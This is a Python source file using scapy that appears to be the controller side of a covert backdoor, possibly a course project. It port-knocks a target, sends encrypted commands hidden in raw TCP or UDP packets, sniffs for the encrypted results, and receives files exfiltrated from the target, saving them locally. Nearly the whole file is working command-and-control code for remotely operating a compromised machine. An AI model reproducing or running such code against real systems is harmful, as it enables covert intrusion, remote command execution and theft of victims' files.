#!/usr/bin/python

import time, configfile, encryption, helpers, os, sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from multiprocessing import Process

# flag to determine when to stop reading the results of a command and decrypt everything
flag = False
Results = ""
resultsForFiles = ""

def checkRoot():
    if(os.getuid() != 0):
        sys.exit("This program must be run with root. Try Again..")

def sniffForFile():
    sniff(filter='{0} and dst port 6000'.format(configfile.protocol), prn=recvFile)

def portKnock():
    for knock in configfile.knock:
        packet = IP(dst=configfile.ip)/UDP(sport=knock, dport=7000)
        send(packet)
        time.sleep(1)

def sendCommand(protocol, data, password):
    if protocol == "tcp":
        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
    if protocol == "udp":
        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
    send(packet, verbose=0)

def recvCommand(packet):
   global flag
   global Results
   if packet.haslayer(IP):
    if packet[IP].src == configfile.ip:
        dataReceived = helpers.parsePacket(packet)
        Results += (dataReceived)
        if packet.haslayer(Raw):
            if packet[Raw].load == configfile.password:
                flag = True
                decryptedData = encryption.decrypt(Results, configfile.masterkey)
                print decryptedData
                Results = ""

def recvFile(packet):
    flag = False
    global resultsForFiles
    if packet.haslayer(IP):
        if packet[IP].src == configfile.ip:
            dataReceived = helpers.parsePacket(packet)
            resultsForFiles += (dataReceived)
            if packet.haslayer(Raw):
                if packet[Raw].load == configfile.password:
                    flag = True
                    decryptedData = encryption.decrypt(resultsForFiles, configfile.masterkey)
                    fileName, fileData = decryptedData.split("\0", 1)
                    fileDescriptor = open(fileName, 'wb')
                    fileDescriptor.write(fileData)
                    resultsForFiles = ""

def main():
    global flag
    checkRoot()
    portKnock()

    fileProcess = Process(target=sniffForFile)
    fileProcess.start()

    while 1:
        command = raw_input("Enter command: ")
        sendCommand(configfile.protocol, command, configfile.password)
        flag = False

        while 1:
            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), count=1, prn=recvCommand)
            if flag == True:
                break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "exiting.."
